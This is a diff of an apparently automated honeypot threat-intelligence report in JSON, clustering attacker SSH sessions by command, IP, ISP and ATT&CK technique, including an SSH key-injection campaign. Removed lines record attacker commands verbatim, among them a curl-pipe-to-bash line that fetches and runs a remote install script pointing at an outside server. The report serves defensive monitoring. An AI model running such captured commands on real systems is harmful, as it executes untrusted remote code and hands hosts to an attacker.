@@ -1,17 +1,17 @@
 {
-  "generated_at": "2026-08-19T18:39:46.301559+00:00",
-  "total_sessions_with_commands": 33,
-  "total_clusters": 5,
+  "generated_at": "2026-08-19T20:32:03.314808+00:00",
+  "total_sessions_with_commands": 32,
+  "total_clusters": 4,
   "campaign_clusters": 1,
-  "singleton_clusters": 2,
+  "singleton_clusters": 1,
   "highest_severity": "HIGH",
   "active_campaigns": [
     {
-      "cluster_id": "CLU-003",
+      "cluster_id": "CLU-001",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 1,
-      "unique_ip_count": 1,
+      "session_count": 2,
+      "unique_ip_count": 2,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -24,85 +24,6 @@
   "clusters": [
     {
       "cluster_id": "CLU-001",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 2,
-      "unique_ips": [
-        "165.1.75.106"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "d2af147dd3fa2817",
-      "ttps": [
-        {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
-        }
-      ],
-      "representative_commands": [
-        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
-        "apt-get update -y",
-        "apt-get install -y python3",
-        "python3 /tmp/bendi.py",
-        "rm /tmp/bendi.py",
-        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
-        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
-      ],
-      "members": [
-        {
-          "session_id": "IR-e72649ba050e",
-          "src_ip": "165.1.75.106",
-          "country": "US",
-          "isp": "Oracle Corporation",
-          "command_count": 7,
-          "timestamp": "2026-08-19T16:48:02.208232Z"
-        },
-        {
-          "session_id": "IR-e7a937fe25d5",
-          "src_ip": "165.1.75.106",
-          "country": "US",
-          "isp": "Oracle Corporation",
-          "command_count": 7,
-          "timestamp": "2026-08-19T16:50:08.522044Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-002",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "93.152.208.38"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "42013f274185057a",
-      "ttps": [],
-      "representative_commands": [
-        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
-        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "Accept-Encoding: gzip, deflate, br",
-        "Accept-Language: en-US,en;q=0.9",
-        "Connection: close"
-      ],
-      "members": [
-        {
-          "session_id": "IR-24c21769464c",
-          "src_ip": "93.152.208.38",
-          "country": "US",
-          "isp": "Euro Crypt EOOD",
-          "command_count": 5,
-          "timestamp": "2026-08-19T15:23:04.504040Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-003",
       "is_campaign": true,
       "campaign_name": "mdrfckr SSH Key Injection",
       "campaign_severity": "HIGH",
@@ -121,11 +42,12 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 1,
+      "session_count": 2,
       "unique_ips": [
-        "51.178.84.57"
+        "194.164.59.59",
+        "45.117.177.47"
       ],
-      "unique_ip_count": 1,
+      "unique_ip_count": 2,
       "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
@@ -155,109 +77,25 @@
       ],
       "members": [
         {
-          "session_id": "IR-72d03d33c8e1",
-          "src_ip": "51.178.84.57",
-          "country": "FR",
-          "isp": "OVH SAS",
+          "session_id": "IR-ad8548b3eeda",
+          "src_ip": "45.117.177.47",
+          "country": "VN",
+          "isp": "Branch of Nhan Hoa Software Company in Ho Chi Minh City",
           "command_count": 2,
-          "timestamp": "2026-08-19T16:21:46.962122Z"
+          "timestamp": "2026-08-19T17:53:52.488781Z"
+        },
+        {
+          "session_id": "IR-1b61ca9dab17",
+          "src_ip": "194.164.59.59",
+          "country": "DE",
+          "isp": "IONOS SE",
+          "command_count": 2,
+          "timestamp": "2026-08-19T17:59:40.554172Z"
         }
       ]
     },
     {
-      "cluster_id": "CLU-004",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 9,
-      "unique_ips": [
-        "110.173.190.221"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "b55d713e4cae43f9",
-      "ttps": [],
-      "representative_commands": [
-        "echo xsec"
-      ],
-      "members": [
-        {
-          "session_id": "IR-358bd0dd923a",
-          "src_ip": "110.173.190.221",
-          "country": "IN",
-          "isp": "PRIMENET GLOBAL LTD.",
-          "command_count": 1,
-          "timestamp": "2026-08-19T14:58:08.827362Z"
-        },
-        {
-          "session_id": "IR-ce34249168c5",
-          "src_ip": "110.173.190.221",
-          "country": "IN",
-          "isp": "PRIMENET GLOBAL LTD.",
-          "command_count": 1,
-          "timestamp": "2026-08-19T15:10:37.768583Z"
-        },
-        {
-          "session_id": "IR-d0cf2ca34457",
-          "src_ip": "110.173.190.221",
-          "country": "IN",
-          "isp": "PRIMENET GLOBAL LTD.",
-          "command_count": 1,
-          "timestamp": "2026-08-19T15:23:06.403981Z"
-        },
-        {
-          "session_id": "IR-f42d08c2d9fc",
-          "src_ip": "110.173.190.221",
-          "country": "IN",
-          "isp": "PRIMENET GLOBAL LTD.",
-          "command_count": 1,
-          "timestamp": "2026-08-19T15:35:38.380008Z"
-        },
-        {
-          "session_id": "IR-ba3d60bee466",
-          "src_ip": "110.173.190.221",
-          "country": "IN",
-          "isp": "PRIMENET GLOBAL LTD.",
-          "command_count": 1,
-          "timestamp": "2026-08-19T15:48:08.261277Z"
-        },
-        {
-          "session_id": "IR-fc6068998bcd",
-          "src_ip": "110.173.190.221",
-          "country": "IN",
-          "isp": "PRIMENET GLOBAL LTD.",
-          "command_count": 1,
-          "timestamp": "2026-08-19T16:13:06.445462Z"
-        },
-        {
-          "session_id": "IR-3d2ca9b1915f",
-          "src_ip": "110.173.190.221",
-          "country": "IN",
-          "isp": "PRIMENET GLOBAL LTD.",
-          "command_count": 1,
-          "timestamp": "2026-08-19T16:25:37.935671Z"
-        },
-        {
-          "session_id": "IR-7fb2955ad781",
-          "src_ip": "110.173.190.221",
-          "country": "IN",
-          "isp": "PRIMENET GLOBAL LTD.",
-          "command_count": 1,
-          "timestamp": "2026-08-19T16:38:08.183992Z"
-        },
-        {
-          "session_id": "IR-b2dd8e9fff3c",
-          "src_ip": "110.173.190.221",
-          "country": "IN",
-          "isp": "PRIMENET GLOBAL LTD.",
-          "command_count": 1,
-          "timestamp": "2026-08-19T16:50:45.401323Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-005",
+      "cluster_id": "CLU-002",
       "is_campaign": false,
       "campaign_name": null,
       "campaign_severity": null,
@@ -280,164 +118,289 @@
       ],
       "members": [
         {
-          "session_id": "IR-b469eac5f784",
+          "session_id": "IR-849075213e67",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T14:58:39.882823Z"
+          "timestamp": "2026-08-19T16:57:33.779324Z"
         },
         {
-          "session_id": "IR-4f579d08bea4",
+          "session_id": "IR-d075a82f609d",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T15:04:36.011316Z"
+          "timestamp": "2026-08-19T17:03:30.622102Z"
         },
         {
-          "session_id": "IR-8a63e02787cd",
+          "session_id": "IR-cd5779c12376",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T15:10:32.744702Z"
+          "timestamp": "2026-08-19T17:09:27.765522Z"
         },
         {
-          "session_id": "IR-8dbee414bc9e",
+          "session_id": "IR-6fdc8d11871b",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T15:16:29.701611Z"
+          "timestamp": "2026-08-19T17:15:25.047735Z"
         },
         {
-          "session_id": "IR-8d54f57f7b75",
+          "session_id": "IR-c5d238d9824a",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T15:22:26.312764Z"
+          "timestamp": "2026-08-19T17:21:22.157123Z"
         },
         {
-          "session_id": "IR-342317fe5372",
+          "session_id": "IR-fef6f0cdd70d",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T15:28:23.002271Z"
+          "timestamp": "2026-08-19T17:27:18.910141Z"
         },
         {
-          "session_id": "IR-cde082032087",
+          "session_id": "IR-7168acc00777",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T15:34:19.683242Z"
+          "timestamp": "2026-08-19T17:33:15.572691Z"
         },
         {
-          "session_id": "IR-d9369b29c3f6",
+          "session_id": "IR-5709a536c1c5",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T15:40:16.523307Z"
+          "timestamp": "2026-08-19T17:39:12.785779Z"
         },
         {
-          "session_id": "IR-91bfa1b9ce74",
+          "session_id": "IR-5302bdd7afcc",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T15:46:13.368534Z"
+          "timestamp": "2026-08-19T17:45:09.733477Z"
         },
         {
-          "session_id": "IR-b9c36a3d6d09",
+          "session_id": "IR-6871ba1f504a",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T15:52:10.410585Z"
+          "timestamp": "2026-08-19T17:51:06.519393Z"
         },
         {
-          "session_id": "IR-cca81f35634e",
+          "session_id": "IR-b5acf6774f8f",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T15:58:07.431144Z"
+          "timestamp": "2026-08-19T17:57:03.249592Z"
         },
         {
-          "session_id": "IR-52785403ad87",
+          "session_id": "IR-1c272f4cf17f",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T16:04:04.273691Z"
+          "timestamp": "2026-08-19T18:03:00.393874Z"
         },
         {
-          "session_id": "IR-57d9fe9aab20",
+          "session_id": "IR-73fc4f4dc07a",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T16:10:01.288140Z"
+          "timestamp": "2026-08-19T18:08:57.371511Z"
         },
         {
-          "session_id": "IR-9ab96e94335f",
+          "session_id": "IR-91576ad40227",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T16:15:57.848092Z"
+          "timestamp": "2026-08-19T18:14:54.173123Z"
         },
         {
-          "session_id": "IR-50a661bb1e5a",
+          "session_id": "IR-48a418726e6b",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T16:21:54.224497Z"
+          "timestamp": "2026-08-19T18:20:50.986940Z"
         },
         {
-          "session_id": "IR-8c65f9a42ade",
+          "session_id": "IR-f72691ceb7b0",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T16:27:50.941865Z"
+          "timestamp": "2026-08-19T18:26:47.492060Z"
         },
         {
-          "session_id": "IR-0e794fbb0333",
+          "session_id": "IR-a04667f11de4",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T16:33:47.443858Z"
+          "timestamp": "2026-08-19T18:32:44.363279Z"
         },
         {
-          "session_id": "IR-4dbc1db25c9b",
+          "session_id": "IR-053b3b7fd93e",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T16:39:44.168764Z"
+          "timestamp": "2026-08-19T18:38:41.019383Z"
         },
         {
-          "session_id": "IR-93d41e3d61bd",
+          "session_id": "IR-17d49c1774cf",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T16:45:40.866737Z"
+          "timestamp": "2026-08-19T18:44:38.685613Z"
         },
         {
-          "session_id": "IR-5ab7101e18a3",
+          "session_id": "IR-1ed4f9d3eecd",
           "src_ip": "85.158.145.129",
           "country": "NL",
           "isp": "cukman-kresimir",
           "command_count": 1,
-          "timestamp": "2026-08-19T16:51:37.232170Z"
+          "timestamp": "2026-08-19T18:50:35.733573Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-003",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 9,
+      "unique_ips": [
+        "110.173.190.221"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "b55d713e4cae43f9",
+      "ttps": [],
+      "representative_commands": [
+        "echo xsec"
+      ],
+      "members": [
+        {
+          "session_id": "IR-5b5fb3cc3f54",
+          "src_ip": "110.173.190.221",
+          "country": "IN",
+          "isp": "PRIMENET GLOBAL LTD.",
+          "command_count": 1,
+          "timestamp": "2026-08-19T17:03:22.172203Z"
+        },
+        {
+          "session_id": "IR-e9c1ff0ad71c",
+          "src_ip": "110.173.190.221",
+          "country": "IN",
+          "isp": "PRIMENET GLOBAL LTD.",
+          "command_count": 1,
+          "timestamp": "2026-08-19T17:15:56.299496Z"
+        },
+        {
+          "session_id": "IR-bcf962d546f6",
+          "src_ip": "110.173.190.221",
+          "country": "IN",
+          "isp": "PRIMENET GLOBAL LTD.",
+          "command_count": 1,
+          "timestamp": "2026-08-19T17:28:26.639227Z"
+        },
+        {
+          "session_id": "IR-4add622cea7f",
+          "src_ip": "110.173.190.221",
+          "country": "IN",
+          "isp": "PRIMENET GLOBAL LTD.",
+          "command_count": 1,
+          "timestamp": "2026-08-19T17:40:53.506416Z"
+        },
+        {
+          "session_id": "IR-69296665ffa1",
+          "src_ip": "110.173.190.221",
+          "country": "IN",
+          "isp": "PRIMENET GLOBAL LTD.",
+          "command_count": 1,
+          "timestamp": "2026-08-19T17:53:23.088967Z"
+        },
+        {
+          "session_id": "IR-533d2cd6b879",
+          "src_ip": "110.173.190.221",
+          "country": "IN",
+          "isp": "PRIMENET GLOBAL LTD.",
+          "command_count": 1,
+          "timestamp": "2026-08-19T18:05:55.858142Z"
+        },
+        {
+          "session_id": "IR-3856deebbce3",
+          "src_ip": "110.173.190.221",
+          "country": "IN",
+          "isp": "PRIMENET GLOBAL LTD.",
+          "command_count": 1,
+          "timestamp": "2026-08-19T18:18:34.100136Z"
+        },
+        {
+          "session_id": "IR-f1fa98d3661b",
+          "src_ip": "110.173.190.221",
+          "country": "IN",
+          "isp": "PRIMENET GLOBAL LTD.",
+          "command_count": 1,
+          "timestamp": "2026-08-19T18:31:09.523694Z"
+        },
+        {
+          "session_id": "IR-b6746cc2bec1",
+          "src_ip": "110.173.190.221",
+          "country": "IN",
+          "isp": "PRIMENET GLOBAL LTD.",
+          "command_count": 1,
+          "timestamp": "2026-08-19T18:43:44.719481Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-004",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "120.26.202.34"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "6fa4c8ac58e7a1d9",
+      "ttps": [
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        }
+      ],
+      "representative_commands": [
+        "uname -s -m"
+      ],
+      "members": [
+        {
+          "session_id": "IR-3965c0c4b784",
+          "src_ip": "120.26.202.34",
+          "country": "CN",
+          "isp": "Aliyun Computing Co., LTD",
+          "command_count": 1,
+          "timestamp": "2026-08-19T18:29:09.649253Z"
         }
       ]
     }
